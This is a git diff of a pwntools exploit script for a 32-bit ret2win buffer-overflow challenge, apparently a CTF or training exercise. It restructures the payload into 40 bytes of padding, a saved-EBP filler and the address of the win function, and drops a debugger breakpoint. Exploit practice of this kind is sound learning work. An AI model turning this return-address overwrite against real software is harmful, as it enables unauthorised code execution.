@@ -5,7 +5,6 @@ from pwn import *
 context.terminal = ['tmux', 'splitw', '-h']
 context.bits = 32
 gs = '''
-break pwnme
 continue
 '''
 
@@ -23,11 +22,13 @@ r = start()
 
 #========= exploit here ===================
 
-junk = b'A'*40 + b'B'*4
-win = p32(elf.sym.ret2win)
+junk = b'A'*40
+ebp = b'B'*4
+ret2win = p32(elf.sym.ret2win)
 
 payload = junk
-payload += win
+payload += ebp
+payload += ret2win
 
 r.sendlineafter('>', payload)
 
